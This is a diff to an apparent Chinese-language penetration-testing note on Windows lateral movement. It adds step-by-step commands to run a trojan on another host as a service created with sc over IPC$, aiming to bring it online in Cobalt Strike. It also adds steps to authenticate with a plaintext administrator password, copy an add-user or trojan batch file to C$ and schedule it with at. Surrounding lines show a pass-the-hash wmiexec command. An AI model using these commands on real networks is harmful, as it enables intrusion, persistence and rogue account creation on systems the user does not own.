@@ -95,10 +95,35 @@
    
    hash攻击命令：wmiexec -hashes :518b98ad4178a53695dc997aa02d455c Administrator@192.168.3.73 "whoami"
    
+ ## 0x07 IPC+windows服务进行横向移动
+ 
+    该方法横向是将木马传入到对方机器里，通过SC命令创建window来指向该传入的木马，重启该服务或者重启机器达到上线CS的目的，该横向步骤如下；
+    
+    1.创建IPC$连接。
+    
+    2.将要运行的服务拷贝到目标机器。
+    
+    3.执行 sc \\192.168.3.144 create cmd binpath="c:\cmd.bat"
+    
+    参考文章：https://www.freesion.com/article/2259895176/
+    
+ ## 0x08 IPC+计划任务进行横向移动
+ 
+     利用AT进行横向移动
+ 
+     1.先建立IPC任务 net use \\192.168.3.144\ipc$ "admin!@#45"/user:rookit.org\administrator
+    
+     2.添加添加用户bat脚本，也可以添加木马脚本
+     
+     3.将bat脚本发送到目标机器copy 1.bat \\192.168.3.144\c$
+     
+     4.利用at启动该bat脚本 at \\192.168.1.144 20:05 c:\adduser.bat （有的系统已经不使用at命令，可以尝试其他命令进行启动，如schtasks）
+ 
+ 
    
   
   
-## 0x06 其他横向技巧
+## 0x09 其他横向技巧
 
   Windows Server 2012及以上不提取密码登录Administrator桌面（登录这个桌面目的是看看Administrator桌面有啥，方便横向）
   
